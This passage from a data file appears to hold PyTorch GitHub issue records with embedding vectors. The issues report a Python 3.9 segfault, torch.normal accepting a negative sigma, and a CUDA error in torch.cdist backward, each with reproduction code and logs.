cc @ezyang @gchanan @zou3519 @bdhirsh @jbschlosser @albanD @mruberry",True,"[-3.14158618e-01 -3.27589154e-01 -9.23760086e-02 -2.75266111e-01
 -2.90770471e-01 -1.60629973e-01  1.14352502e-01 -1.18528120e-03
 -9.39409211e-02 -7.80744106e-02  2.67525017e-02  9.70406309e-02
  3.01738888e-01 -4.12767418e-02 -2.46098161e-01  1.55986309e-01
 -1.28906623e-01 -1.45040691e-01 -1.12256005e-01 -3.36554646e-02
 -3.25187057e-01 -2.65349358e-01 -2.19377041e-01  1.31064922e-01
  2.00520992e-01  1.19177908e-01 -2.71632850e-01 -2.74825133e-02
  4.43992168e-01  1.10989615e-01  1.62149727e-01  2.01543510e-01
  6.74671680e-02  5.78099191e-02 -1.28308430e-01  4.93977398e-01
 -3.62121701e-01 -3.57664883e-01  3.84077057e-03  2.00085640e-01
 -1.33409258e-03  1.97598845e-01  1.81167483e-01 -3.36104214e-01
 -3.34766395e-02 -1.18121140e-01 -3.92728090e-01  2.07007945e-01
 -4.31326851e-02 -1.71865486e-02  3.10337357e-02  2.78954178e-01
 -2.94038653e-01  2.41612270e-03 -9.59459692e-04  2.10458264e-02
 -1.25365585e-01  2.15837583e-01 -9.73827988e-02  4.16711997e-03
  1.67912662e-01 -9.26461350e-03 -5.57255372e-02 -9.46936011e-02
  1.68798983e-01  5.27577326e-02  1.05221167e-01  2.85883471e-02
  3.82896751e-01  1.37211978e-01  1.16525397e-01  2.20146418e-01
 -2.10767522e-01 -1.27856582e-01  2.21629843e-01  1.78195208e-01
 -1.98002994e-01  4.27618831e-01  4.07617632e-03 -5.36341429e-01
  2.39384860e-01  3.23392972e-02  1.94465108e-02  1.38029214e-02
  3.56575161e-01 -3.63917381e-01  2.68170416e-01 -7.49630705e-02
  3.97608548e-01  5.96178398e-02  3.92482758e-01 -5.88245504e-02
  2.68529356e-03  3.84814858e-01  1.07567623e-01  3.92521530e-01
  1.44549876e-01  2.66688447e-02 -3.03957075e-01  3.61702964e-02
 -1.07882485e-01  1.53504729e-01  6.03389367e-02  9.87629890e-02
 -1.07246563e-01 -1.50761813e-01  4.21354115e-01 -2.51868367e-03
  1.97645053e-01  7.53008723e-02 -1.58321992e-01 -1.76229089e-01
  1.12649187e-01 -1.74524993e-01 -6.45698085e-02 -2.96511710e-01
  3.14746797e-01 -5.49501292e-02  6.76433295e-02 -2.52061188e-01
 -4.44611236e-02 -1.21588349e-01  4.89289090e-02  8.72867629e-02
  3.45717639e-01  2.32744128e-01  7.79354423e-02 -1.70205817e-01
 -3.40342149e-02 -3.07773650e-01  1.76105499e-01  1.50607824e-01
 -2.31641293e-01 -2.96202570e-01  2.03145593e-01  6.68899417e-02
 -2.60821164e-01 -3.48637581e-01 -1.67492017e-01 -4.92071867e-01
  1.46147609e-03 -1.70355678e-01  1.58676952e-01 -6.38204068e-02
  9.94424745e-02 -7.63320550e-02 -2.96974897e-01 -1.77651256e-01
 -9.47971828e-03  2.79404856e-02  8.88306350e-02 -2.77626812e-01
 -2.15720057e-01  9.60832834e-02  6.11531436e-02  9.00760964e-02
  5.06106839e-02  1.72197148e-02  6.15288801e-02 -8.27492103e-02
  7.22493678e-02  4.84189838e-02 -7.96937272e-02  1.92208737e-02
  3.39497387e-01  3.24334443e-01 -3.25633213e-04 -2.29361936e-01
 -1.54303402e-01 -5.19350842e-02  1.82253625e-02 -2.79031038e-01
  1.32624641e-01 -1.06848150e-01  3.39647353e-01 -2.21291929e-01
 -1.33115381e-01 -5.22126593e-02 -1.49135709e-01  2.68000662e-01
  1.02576301e-01  1.45429417e-01  2.39505060e-03  9.90551263e-02
  8.16823840e-02  2.68964380e-01  1.09563544e-01  2.54838735e-01
 -6.86877072e-02  5.63317649e-02 -1.48357257e-01 -4.91367318e-02
 -5.97561616e-03 -4.05047126e-02 -2.03248039e-01 -4.18321311e-01
  5.97857594e-01  3.45090479e-01  1.80661082e-01  4.00963202e-02
 -2.02955276e-01  1.36993736e-01  2.31399834e-01 -1.49311826e-01
 -1.13169298e-01 -2.24859081e-02 -1.34529054e-01 -1.99353188e-01
  2.53250673e-02  1.77408099e-01 -2.14587420e-01 -3.87018882e-02
  2.45954588e-01 -4.34149206e-01 -1.53828198e-02 -2.21524850e-01
 -4.60292250e-02  6.75578788e-03 -5.80977462e-02  6.61877915e-02
  1.25518367e-01  2.50860214e-01  3.20552170e-01 -2.04300761e-01
  1.01906791e-01  2.86579639e-01 -8.83205086e-02 -1.05419315e-01
  1.50533497e-01 -1.12293892e-01  1.16091907e-01 -3.31958383e-01
  4.65748608e-01  3.59904110e-01 -1.36533499e-01  1.10689372e-01
 -2.13351399e-01  1.53406426e-01  1.69036955e-01 -6.57218769e-02
  6.06346652e-02 -5.04962862e-01  1.84272259e-01 -2.17521340e-01
  4.84516993e-02  1.62660420e-01 -1.82427585e-01  1.22814119e-01
 -3.23244691e-01 -6.33499473e-02 -4.26534414e-02  1.21236734e-01
  1.79040641e-01 -3.10849607e-01  3.47652286e-01 -1.39326289e-01
  1.50421947e-01 -6.36719689e-02  2.06831675e-02 -2.33282641e-01
  2.30557099e-02  3.00086230e-01 -3.45512211e-01  2.76265621e-01
  4.04601812e-01 -8.23021978e-02 -2.14606822e-01  1.24310158e-01
  1.32994503e-01 -7.07354769e-02  4.40167606e-01 -2.49190837e-01
  1.33789033e-01 -7.33924508e-02  2.95995086e-01 -1.51708543e-01
  2.68943131e-01  4.38537486e-02  2.54974902e-01  1.87410079e-02
 -2.52338231e-01  3.06168199e-01 -2.83499271e-01 -4.98864688e-02
  1.55980170e-01 -1.59889549e-01  3.68386544e-02 -2.37997666e-01
 -8.28073546e-02 -3.36707160e-02 -2.14753032e-01  2.16132820e-01
  1.38728231e-01 -1.27137661e-01 -2.51320392e-01  1.04034193e-01
  2.17537403e-01 -1.26712367e-01  1.54507756e-01 -9.64739323e-02
 -4.82592732e-02 -3.91521268e-02  1.82714447e-01 -5.93164973e-02
 -3.59161764e-01  1.75129399e-01 -8.47633481e-02  2.64995903e-01
 -6.22735657e-02 -2.49323428e-01  4.82275903e-01  1.59358293e-01
 -2.24816889e-01  2.99443603e-01  1.53160933e-02  2.62060076e-01
  1.03133924e-01 -1.03897229e-03  7.57027119e-02  7.04731345e-02
 -2.53311813e-01 -6.25302717e-02 -5.41666865e-01  4.09587443e-01
  3.06581974e-01 -3.40105891e-02 -3.94573450e-01 -3.26928757e-02
 -2.18796939e-01  3.67528349e-01  1.85696125e-01 -2.76397802e-02
 -1.25504881e-01 -4.80528101e-02 -6.82193711e-02 -2.70612359e-01
 -6.56214178e-01  2.20923990e-01 -1.37828052e-01 -3.16718847e-01
  4.16918397e-02 -5.67694157e-02  8.63270462e-02 -9.49106440e-02
 -1.92410737e-01 -6.49587661e-02 -1.79307133e-01  3.37711126e-01
  2.29164492e-03 -5.38378581e-02  3.79517004e-02 -1.45150069e-02
 -1.00748330e-01 -6.12991527e-02 -2.79359818e-02  1.46733642e-01
  2.44248375e-01  1.17349640e-01  9.17858332e-02  1.18996486e-01
 -5.49352244e-02 -1.67146280e-01  3.38136666e-02  1.09629467e-01
 -6.24329690e-03 -2.15564206e-01 -4.72706705e-02 -1.62010938e-02
  3.02180886e-01 -3.12945187e-01 -6.17838316e-02 -2.55229920e-02
 -2.23908816e-02  5.50900772e-02  3.68642092e-01 -2.58438647e-01
 -1.63153350e-01 -1.15377810e-02  7.19923377e-02 -1.58394217e-01
 -3.06567609e-01  1.46873146e-01 -2.38850683e-01  1.39229074e-01]"
Segfault with nightly in python 3.9 high priority triaged module: pybind,"## ðŸ› Bug

A simple code segfaults in nightly builds with python 3.9 but works with python 3.8
## To Reproduce
Content of `Dockerfile`:
```
FROM python:3.9-slim-buster
# works with 3.8
USER root
WORKDIR /root
RUN apt-get update && apt-get install git build-essential --yes
RUN python3 -m pip install --upgrade pip
RUN python3 -m pip install --pre torch==1.8.0.dev20210102+cpu  -f https://download.pytorch.org/whl/nightly/cpu/torch_nightly.html
RUN python3 -m pip install Pillow
RUN git clone https://github.com/pytorch/vision/
ENV PYTHONPATH=./vision
COPY test-backbone.py /
RUN python /test-backbone.py
```

Content of `test-backbone.py`:
```
from torchvision.models import resnet50
import torch


if __name__ == ""__main__"":
    backbone = resnet50(pretrained=True)

    img = torch.randn((2, 3, 256, 288))
    features = backbone(img)
    loss = features.sum()
    loss.backward()
    print(""exiting"")
```

Run `docker build  -t py39:v0 .`

Logs:
```
Step 11/11 : RUN python /test-backbone.py
 ---> Running in 31a88ed05b3d
Downloading: ""https://download.pytorch.org/models/resnet50-19c8e357.pth"" to /root/.cache/torch/hub/checkpoints/resnet50-19c8e357.pth
100.0%
exiting
Segmentation fault (core dumped)
The command '/bin/sh -c python /test-backbone.py' returned a non-zero code: 139

```

cc @ezyang @gchanan @zou3519 @bdhirsh @jbschlosser",True,"[-0.12747492 -0.5162868  -0.05876531 -0.116974    0.04635456 -0.18044317
 -0.20245498  0.02505564 -0.21393168 -0.19750655 -0.34695208  0.12126571
  0.04580708  0.07485271 -0.24371569  0.17509872 -0.02308087 -0.3545725
  0.14025146 -0.10393026 -0.01753564  0.12835643 -0.2033023   0.11835564
  0.16218926 -0.05795526 -0.32058865  0.03977159  0.06250519  0.18612854
  0.23258062  0.13576654 -0.00645467 -0.01363335  0.22706108  0.192383
 -0.03937232 -0.30232832 -0.36088532 -0.12999088  0.2043261   0.03251129
 -0.19177464  0.29968363 -0.3302783  -0.10259604 -0.14225486 -0.07127158
 -0.27162325  0.18729147 -0.41257846  0.0516567  -0.22976565 -0.22908852
  0.47400957 -0.04952002 -0.07293718  0.31875437  0.20732844 -0.01461982
 -0.24192216  0.14835219  0.1848349   0.17078145  0.07640389  0.42636472
 -0.12201689  0.0224799   0.15043166  0.02525091 -0.01309936 -0.22929202
 -0.420088   -0.2645972  -0.2625854  -0.02260217 -0.2987339  -0.03330159
 -0.07893872  0.1451265  -0.27320397 -0.08477417  0.01255717 -0.09216186
  0.22894248 -0.18845108  0.20460427  0.15756437  0.05514108  0.22609998
  0.36847705  0.11563443  0.04255267  0.40486872  0.23400852  0.13809042
  0.21989247 -0.2269718  -0.25339353 -0.13150263  0.03405507 -0.19005741
  0.07230015  0.22507149  0.14967419 -0.03317838  0.24541524  0.00752691
 -0.07014166  0.00461158  0.18180186  0.02816248  0.2600801  -0.12704986
  0.03083454  0.4921471  -0.11621732  0.4017435   0.2687333   0.5616689
  0.08309084  0.25843206  0.01622384  0.18988328  0.15997687  0.26527417
  0.02357719 -0.09780841  0.1193913  -0.2337546  -0.04443656  0.22586095
 -0.233262    0.05250005  0.22657785  0.11294633 -0.17051654 -0.23808599
  0.0017715  -0.36399287  0.00476343 -0.20211956  0.07201377 -0.37401742
  0.13524865  0.16898885 -0.2635409   0.39423108 -0.09077866 -0.13275768
 -0.0588166  -0.08965885 -0.44230598  0.19001856 -0.0048331  -0.08831261
  0.38326028  0.05764103  0.18931636  0.03979441 -0.27155545  0.30554292
 -0.02865161 -0.05839257  0.00396331 -0.00995966 -0.40552416 -0.10090106
 -0.19024633 -0.23018485 -0.21398729 -0.06583892 -0.08642443 -0.21685618
  0.08846876 -0.07465506  0.18663198 -0.3623274   0.31824112  0.10712292
  0.22369191  0.43466252 -0.08669931  0.17023227  0.04214832 -0.27678058
  0.01650082 -0.21263365  0.07722034 -0.26564962 -0.16325924 -0.31929475
  0.6331655  -0.36157215 -0.02375147  0.24389769  0.08729223  0.09870569
  0.2728774   0.04544462  0.20769888  0.19890726  0.10807101  0.01115105
 -0.1472061   0.07882418 -0.17575859 -0.01383087  0.03122665  0.04721185
  0.13902701 -0.3114196   0.02193332 -0.16639483 -0.15629722  0.37305892
 -0.05628424 -0.04144573  0.24769454  0.11959065  0.11616188 -0.08252715
 -0.17014429 -0.15889446  0.15273312 -0.07280735 -0.04728436  0.08988607
 -0.14454344  0.06849056 -0.12111744 -0.18540466  0.262331    0.02829331
 -0.00966685  0.06988089  0.13254495  0.01828071 -0.02845614  0.30490494
  0.07378936 -0.11081795  0.07425492 -0.19444552  0.09586367 -0.41529274
 -0.23937574 -0.06287391 -0.33239242  0.16438583  0.10511602 -0.02793353
 -0.04079231  0.03139334  0.44830504  0.23508245 -0.35057777  0.07814115
  0.10152966 -0.08725696  0.07173357  0.16190884 -0.03629934  0.25998917
  0.30580032  0.10851824 -0.02975848  0.3360961   0.09828737 -0.17376104
  0.33537388 -0.18836236  0.36817697  0.05458149  0.09352063  0.12910223
  0.33629787 -0.08214997  0.12612699 -0.15018351 -0.05099689  0.14724016
 -0.35911202  0.17449817  0.10818118  0.06939825  0.16401273 -0.27509746
 -0.24585241  0.3061253  -0.16624014 -0.29739738  0.12063801  0.04540122
 -0.16996485 -0.02397908 -0.18530595 -0.16340175  0.18945548 -0.06133649
 -0.24301106  0.22045846 -0.03565937  0.06234473 -0.03434548  0.0613929
 -0.21144769  0.16096106  0.13351883 -0.4494683   0.5007211   0.22173384
 -0.20226072  0.01762948 -0.09081627  0.2124861  -0.42967737  0.21402344
  0.18079545 -0.13437657 -0.18006703 -0.19138913 -0.60828114  0.2483592
  0.33281872  0.13863394 -0.31677076 -0.02824935 -0.2514267  -0.2895536
  0.02015363  0.01726706 -0.11526629  0.14058018 -0.0152219  -0.0580166
 -0.20423801 -0.13470072 -0.06953306 -0.46981293 -0.00790602 -0.29038993
  0.27204728 -0.17289838 -0.30632502  0.05520264  0.24702732  0.47918755
 -0.03047254 -0.3188275   0.12389271  0.03811143 -0.5657952  -0.0391492
 -0.45482925  0.38257825  0.1488063   0.24381274  0.24415135  0.32662547
 -0.25364688 -0.04877351 -0.35011417 -0.20463899  0.02695175  0.03528269
 -0.28412077  0.17149046 -0.02257071  0.3329348   0.05128532  0.16343895
 -0.04407018  0.37599748  0.16028462  0.14303423  0.03106456  0.03236827
  0.14029467 -0.273916   -0.11288014  0.15374666  0.1047193   0.0017265 ]"
torch.normal only issues error for negative sigma when shape argument is given high priority triaged module: random module: correctness (silent),"## ðŸ› Bug

As explained in [this forum thread](https://discuss.pytorch.org/t/how-does-torch-normal-work-with-a-negative-standard-deviation/107571/3) torch.normal only gives an error for negative sigma when there is no size argument given in. Code examples are below.

## To Reproduce

Steps to reproduce the behavior:

This code cause an error...

```
torch.manual_seed(8)
torch.normal(0, -1, (10, ))

# output
# RuntimeError                              Traceback (most recent call last)
# <ipython-input-6-f3bb1e6c1119> in <module>()
    #   1 torch.manual_seed(8)
# ----> 2 torch.normal(0, -1, (10, ))

# RuntimeError: normal_ expects std > 0.0, but found std=-1
```

while this code causes no error...

```
mu = torch.tensor(0.0)
sigma = torch.tensor(-3.0)
torch.normal(mu, sigma)

# ...output
>>> torch.normal(mu, sigma)
tensor(-3.6977)
>>> torch.normal(mu, sigma)
tensor(-3.0448)
>>> torch.normal(mu, sigma)
tensor(-0.2327)
```

<!-- If you have a code sample, error messages, stack traces, please provide it here as well -->

## Expected behavior

I would expect that the error reporting would be consistent and that a negative standard deviation on a singleton sample would also give an error.

## Environment

Please copy and paste the output from our
[environment collection script](https://raw.githubusercontent.com/pytorch/pytorch/master/torch/utils/collect_env.py)
(or fill out the checklist below manually).

You can get the script and run it with:
```
wget https://raw.githubusercontent.com/pytorch/pytorch/master/torch/utils/collect_env.py
# For security purposes, please check the contents of collect_env.py before running it.
python collect_env.py
```

 - PyTorch Version (e.g., 1.0): 1.7.0+cu110
 - OS (e.g., Linux): 20.04
 - How you installed PyTorch (`conda`, `pip`, source): pip
 - Build command you used (if compiling from source): N/A
 - Python version: 3.8.5



cc @ezyang @gchanan @zou3519 @bdhirsh @jbschlosser @fritzo @neerajprad @alicanb @vishwakftw @nikitaved @pbelevich",True,"[-3.65048647e-01  8.16884935e-02 -1.45282894e-01  1.79988593e-02
 -1.80888057e-01  1.52073264e-01 -1.96833331e-02  2.04503626e-01
 -2.41428673e-01  7.67362304e-03  5.23993708e-02  2.36259446e-01
  1.41453758e-01  9.11214650e-02 -1.51479803e-03  1.49361253e-01
 -1.20899022e-01 -1.53942540e-01 -2.66310513e-01 -6.09195083e-02
  1.23850085e-01 -1.13726854e-01  3.06316353e-02 -1.06304586e-01
 -2.14356959e-01  4.43110503e-02 -1.15957424e-01 -4.26566787e-02
  4.63816762e-01 -6.71649873e-02 -2.60676682e-01  4.80535887e-02
 -1.29720762e-01  1.78973358e-02  1.01779804e-01 -1.96565837e-01
 -2.48567849e-01  3.61337885e-02 -3.61889452e-01 -1.06993817e-01
  2.33258396e-01  1.59364581e-01  3.24706137e-02  9.61823985e-02
 -1.02832705e-01  5.10414615e-02 -9.38996971e-02 -1.92721840e-02
 -4.26084161e-01 -1.67163629e-02 -1.46930858e-01  9.44155976e-02
  3.15831490e-02  1.32635519e-01  2.90710200e-02 -2.82124788e-01
 -2.36151218e-01 -1.28871560e-01 -6.03848845e-02 -2.70564139e-01
  1.47381172e-01 -1.19589679e-02 -1.43202499e-01 -3.55248421e-01
  3.26637387e-01 -1.52799442e-01  6.86848462e-02  1.09108508e-01
  5.45910835e-01  3.06662083e-01  2.45472744e-01  3.92511226e-02
  6.92647099e-02 -3.41910832e-02  8.47656876e-02  2.91752862e-04
 -4.68209654e-01  2.61263132e-01 -2.01138467e-01 -4.40070033e-01
  1.29551560e-01 -1.57493919e-01 -2.41951853e-01 -5.20200096e-02
  2.18825907e-01 -1.49596315e-02  2.85196185e-01 -4.47150581e-02
  3.49754095e-01  3.24019194e-01 -4.04723659e-02  3.73372547e-02
 -9.41101760e-02  2.15127915e-01 -1.91070944e-01  2.16914713e-01
  8.99663866e-02 -9.53385681e-02 -1.09968677e-01 -2.05935184e-02
 -2.52954662e-04 -4.79488790e-01 -2.98519373e-01  3.67391557e-01
  1.23039722e-01 -2.44646430e-01  2.55375385e-01  5.36515772e-01
 -1.62874535e-03  1.41044617e-01  3.46537113e-01 -1.41126901e-01
  6.73187077e-02 -4.87705506e-02 -1.44352987e-01 -3.71963948e-01
  1.91540062e-01 -2.96059530e-03  2.02471800e-02  7.59686679e-02
  3.10349822e-01  2.29971290e-01  3.71687077e-02 -1.02494787e-02
  3.40588361e-01  1.80117965e-01  4.06332016e-02 -7.04766065e-02
  3.25695127e-02  1.76403105e-01  9.92849469e-02 -2.44124494e-02
 -1.13522731e-01 -1.02419041e-01  2.23663211e-01  4.60910320e-01
 -2.03275874e-01  1.37686834e-01  6.14890233e-02 -1.41345188e-02
  1.17814675e-01 -4.92691062e-03 -5.28719984e-02  1.34332299e-01
  1.31998450e-01 -1.65711313e-01 -2.54330218e-01  3.53079177e-02
  4.13965940e-01 -1.67251378e-03 -3.79446894e-03 -1.59969330e-01
 -4.31625098e-01  3.69190611e-02  3.31972092e-02  1.32585485e-02
 -4.25958559e-02 -6.14863187e-02  3.65078926e-01 -1.81027979e-01
  1.20723307e-01  1.31982267e-01  2.62992740e-01  7.26695955e-02
  1.57666832e-01  2.91118115e-01 -6.36073649e-02 -1.47254527e-01
 -2.85646349e-01  2.15838745e-01  1.72337472e-01 -3.11041713e-01
 -5.74478619e-02 -1.53195679e-01  2.83756405e-02 -2.88205445e-01
 -2.07293525e-01 -2.08447143e-01 -2.43691325e-01  3.24264199e-01
  3.13049376e-01  4.81015861e-01  2.52185106e-01  1.96369976e-01
 -1.70394436e-01  3.38035554e-01  2.35739976e-01  9.18424577e-02
  6.61002100e-02 -1.49526402e-01 -3.08740258e-01 -2.40682185e-01
  6.30921647e-02  2.35284865e-01 -1.87787026e-01 -6.22813888e-02
  1.74867511e-01 -5.90746403e-01  1.12288922e-01 -5.78606501e-02
 -9.32495892e-02 -9.97649133e-02 -2.96424534e-02 -1.30101532e-01
  3.91593039e-01  7.05742240e-02 -8.04337710e-02 -4.09829378e-01
 -3.44838887e-01  4.50606272e-03 -5.10386407e-01 -2.85281062e-01
  1.02822874e-02 -3.39942604e-01 -1.37659470e-02  2.50466138e-01
 -1.84149623e-01 -1.10170446e-01  2.53759742e-01  2.89842695e-01
  2.04075947e-01  1.43398777e-01 -1.53548211e-01 -1.55944228e-01
 -8.06478113e-02  3.19985360e-01 -2.75216311e-01  3.79817635e-02
  6.98905885e-02 -2.02117749e-02 -5.99968508e-02 -3.17125916e-01
  2.23633587e-01  1.56811327e-01  2.10208848e-01  4.40576851e-01
 -1.31845206e-01  1.97135024e-02 -7.51584470e-02 -9.47877318e-02
 -8.88918191e-02 -1.90613002e-01  2.79219121e-01 -1.22638963e-01
 -1.21902451e-01  3.44510913e-01 -3.71993870e-01  3.00047174e-02
 -1.32070452e-01  6.72576949e-02 -2.63875514e-01  1.37948006e-01
 -6.23243079e-02 -2.19958335e-01  4.95238215e-01  1.71282828e-01
  1.48885608e-01 -1.45332903e-01 -4.71472256e-02 -1.87255472e-01
 -4.27412987e-02  2.85929143e-01  1.87809706e-01  3.04571867e-01
  1.19558528e-01  9.79070738e-02 -1.36151388e-01  3.47501159e-01
 -1.47805840e-01  5.25192060e-02  1.95082307e-01 -4.59939361e-01
  2.78345287e-01  1.45696998e-01  1.07119665e-01 -3.96933913e-01
 -1.35153476e-02  5.84475547e-02 -4.48774807e-02 -3.96923661e-01
  8.84929299e-02  3.59038353e-01 -7.53132254e-02  8.51715356e-02
  4.30864006e-01 -2.23889813e-01 -3.07847828e-01 -1.97246939e-01
  2.16672346e-02 -1.30814463e-01  5.75605258e-02  2.03240976e-01
  5.31428695e-01 -2.86905408e-01 -3.38483393e-01  2.19473884e-01
  1.59821525e-01 -2.44251907e-01  1.72043554e-02 -4.93077561e-03
  1.48057371e-01  2.32860446e-01  4.18362141e-01 -1.68197647e-01
 -2.69455343e-01  9.75902975e-02  5.36816679e-02 -3.57878022e-03
  5.89901090e-01 -2.15822458e-01  1.01361498e-01  1.08389724e-02
 -8.52171779e-02  2.71343231e-01 -1.75984859e-01 -6.61939979e-02
 -2.78153151e-01  1.71538547e-01  1.96021423e-01  8.11743885e-02
 -8.38781372e-02 -2.33961746e-01 -2.89438426e-01  1.39995515e-01
  1.38161093e-01 -1.97040915e-01 -9.02137160e-02 -1.22264370e-01
 -2.63960604e-02  1.18831046e-01  1.69677973e-01 -9.70357656e-03
  2.84896016e-01  3.98168936e-02 -6.84973598e-02 -3.19330424e-01
 -1.35366008e-01  3.87378633e-01 -1.93935752e-01 -2.86047876e-01
 -3.16871017e-01 -1.03063591e-01  1.11870825e-01 -1.72999680e-01
 -2.43469492e-01 -7.79087916e-02  1.69309508e-03 -2.12864161e-01
 -3.22599411e-01 -2.30152085e-01 -2.38006309e-01 -4.57690135e-02
  2.92542458e-01  2.52495617e-01 -2.29721516e-01  2.91994780e-01
  1.91176474e-01  5.32291234e-02  3.42773423e-02  2.68377900e-01
 -1.27650529e-01 -1.40787950e-02 -2.21850917e-01 -2.18626454e-01
 -1.65879697e-01  8.16023648e-02 -2.25665662e-02 -1.19712420e-01
 -3.07357181e-02  1.60885125e-01 -5.37419133e-02  2.76960611e-01
  1.31974220e-01 -3.60068791e-02  2.22722352e-01 -2.07750887e-01
  2.18096524e-01 -7.61051252e-02  1.59472793e-01 -1.59967333e-01
  1.79172054e-01  1.11370474e-01 -4.02523339e-01 -1.29583329e-01]"
CUDA error: invalid configuration argument during backward through torch.cdist module: cuda triaged module: distance functions,"## ðŸ› Bug

When back-propagating through torch.cdist operator, the GPU device throws an RuntimeError exception titled:
```
CUDA error: invalid configuration argument.
```

## To Reproduce

Steps to reproduce the behavior:

1. create a Python file 'test.py':
```
import torch

for i in range(510, 520):
    a = torch.zeros((4, i, 32)).normal_(0, 1).cuda()
    b = torch.zeros((4, i, 32)).normal_(0, 1).cuda()
    a.requires_grad = True
    b.requires_grad = True
    c = torch.cdist(a, b, p=1.0)
    print(c.size())
    d = c.mean()
    d.backward()
    print(a.grad.size(), b.grad.size())
```

2. Run command 'python test.py', and it shows the output like:

```
torch.Size([4, 510, 510])
torch.Size([4, 510, 32]) torch.Size([4, 510, 32])
torch.Size([4, 511, 511])
torch.Size([4, 511, 32]) torch.Size([4, 511, 32])
torch.Size([4, 512, 512])
Traceback (most recent call last):
  File ""test.py"", line 13, in <module>
    d.backward()
  File ""/home/wanyu/anaconda3/envs/pt1.7/lib/python3.8/site-packages/torch/tensor.py"", line 221, in backward
    torch.autograd.backward(self, gradient, retain_graph, create_graph)
  File ""/home/wanyu/anaconda3/envs/pt1.7/lib/python3.8/site-packages/torch/autograd/__init__.py"", line 130, in backward
    Variable._execution_engine.run_backward(
RuntimeError: CUDA error: invalid configuration argument
```

## Expected behavior

Wish this issue can be fixed.

## Environment

PyTorch version: 1.7.1
Is debug build: False
CUDA used to build PyTorch: 11.0
ROCM used to build PyTorch: N/A

OS: Ubuntu 18.04.5 LTS (x86_64)
GCC version: (Ubuntu 7.5.0-3ubuntu1~18.04) 7.5.0
Clang version: Could not collect
CMake version: version 3.12.0

Python version: 3.8 (64-bit runtime)
Is CUDA available: True
CUDA runtime version: 10.0.130
GPU models and configuration: 
GPU 0: GeForce GTX 1080 Ti
GPU 1: GeForce GTX 1080 Ti

Nvidia driver version: 450.80.02
cuDNN version: /usr/lib/x86_64-linux-gnu/libcudnn.so.7.6.5
HIP runtime version: N/A
MIOpen runtime version: N/A

Versions of relevant libraries:
[pip3] numpy==1.19.2
[pip3] torch==1.7.1
[conda] blas                      1.0                         mkl  
[conda] cudatoolkit               11.0.221             h6bb024c_0  
[conda] mkl                       2020.2                      256  
[conda] mkl-service               2.3.0            py38he904b0f_0  
[conda] mkl_fft                   1.2.0            py38h23d657b_0  
[conda] mkl_random                1.1.1            py38h0573a6f_0  
[conda] numpy                     1.19.2           py38h54aff64_0  
[conda] numpy-base                1.19.2           py38hfa32c7d_0  
[conda] pytorch                   1.7.1           py3.8_cuda11.0.221_cudnn8.0.5_0    pytorch

## Additional context

It seems to me that this issue is relevant to Issues #27209 #31593 and pull requests #31167 #31593.

And this is just my guessing. The program fails at 'i' being 512, leading to the number of elements as 4 * 512 * 32 = 65,536. The afrementioned issues and pull requests also mentioned that the y/z-dimension of grid (gridDim.y/z, the maximum number of blocks along dimension y/z within each grid) should not exceed 65,535. Maybe this setting goes beyond the maximum value of grid size (gridDim.y > 65,535 or gridDim.z > 65.535).

Wish this can offer help. Thanks!


cc @ngimel",True,"[-2.53048837e-01 -2.37611867e-02 -4.12783027e-01  1.44125953e-01
 -1.80122048e-01 -3.57172847e-01 -1.15736842e-01  3.22360635e-01
 -4.58815694e-01 -1.65708959e-02 -1.51160955e-02 -2.34136015e-01
 -1.98935717e-01  3.41989323e-02 -1.69089600e-01  4.24209312e-02
 -2.11561680e-01 -1.15941785e-01 -1.30039930e-01 -1.32144004e-01
  1.56352416e-01  2.09783360e-01 -1.09923884e-01 -2.41533130e-01
  3.02286409e-02  1.25596598e-01 -2.68069625e-01 -7.10653141e-02
  4.18633103e-01  1.23225115e-02 -1.52313918e-01 -1.18796453e-01
 -5.16324759e-01  7.28811920e-02  3.64840806e-01 -1.81707874e-01
 -5.93666375e-01 -1.32872328e-01 -1.10129125e-01  5.78783266e-03
 -4.68310900e-02 -6.03017770e-03 -1.04322478e-01  1.13930956e-01
 -1.62942886e-01 -3.12536303e-03 -6.07170463e-02  2.42193371e-01
 -2.37465888e-01 -1.78746343e-01  8.30101669e-02  3.37057710e-01
  2.05827728e-02  1.19877361e-01  2.13210024e-02 -4.58159931e-02
 -3.73531282e-01  2.94494748e-01  1.62174135e-01 -3.74584734e-01
  5.79726815e-01  5.45546301e-02 -1.04767971e-01 -2.75098294e-01
 -4.07023318e-02 -1.31617665e-01 -1.30876034e-01  1.48350194e-01
  4.14208114e-01  8.84246379e-02 -1.16091222e-01  1.57791451e-01
 -2.75720030e-01 -6.24200329e-02  1.75142102e-02  1.25021219e-01
 -1.96481898e-01  1.63458586e-01 -4.24095601e-01 -3.07659984e-01
  2.37402350e-01 -2.47904062e-02 -1.65798932e-01 -8.00116211e-02
  2.68334448e-01 -2.43586879e-02  2.92005002e-01  1.17735229e-02
  2.04946697e-01  2.77069747e-01  2.81776804e-02  2.09822774e-01
 -1.65933937e-01  3.36347759e-01 -2.57179201e-01 -3.85646299e-02
  7.13088661e-02 -2.65080929e-01 -2.56842226e-01 -1.27403423e-01
  7.26811439e-02 -5.18526196e-01 -1.95842057e-01  6.38949990e-01
  1.28281564e-01 -2.53370553e-01  1.18344083e-01  3.92914772e-01
  5.75498454e-02 -6.47484288e-02  2.86185563e-01 -2.30831355e-02
 -2.00310834e-02 -2.41242647e-02  8.39802995e-03 -2.97838658e-01
 -4.42671776e-01 -1.35270029e-01  2.76369900e-02  7.38572702e-02
  3.35219614e-02  3.27418685e-01 -5.48450947e-02  1.64681554e-01
  4.20643091e-01 -1.55647948e-01  2.65494645e-01 -6.22622520e-02
 -3.14658433e-02  1.03380270e-01  1.42274052e-01 -7.35311061e-02
  7.86833912e-02 -6.44172803e-02  3.34111631e-01  5.73927641e-01
 -2.53081888e-01  6.47506639e-02 -7.89447501e-02 -6.68910369e-02
 -1.13762110e-01 -2.20547244e-03 -9.86288041e-02 -1.49836525e-01
  3.51135254e-01  1.55407071e-01 -1.82596356e-01  4.02970389e-02
  1.91577882e-01  2.51368970e-01  7.57553279e-02 -9.19812471e-02
 -5.56600332e-01  2.38365650e-01 -3.08953431e-02 -1.02146953e-01
  2.59563804e-01  5.28488941e-02  2.09737152e-01 -3.15933466e-01
  3.06317687e-01  1.13273650e-01  1.83223352e-01 -5.25289029e-02
  9.09603760e-03  1.02077790e-01  1.62201431e-02 -1.53860644e-01
 -5.61285555e-01  2.81353951e-01  5.94067797e-02 -2.51037449e-01
  1.01952076e-01  9.72315669e-04  3.39513540e-01 -2.15996176e-01
 -2.79588044e-01 -1.16765790e-01 -1.10884830e-01  4.22196865e-01
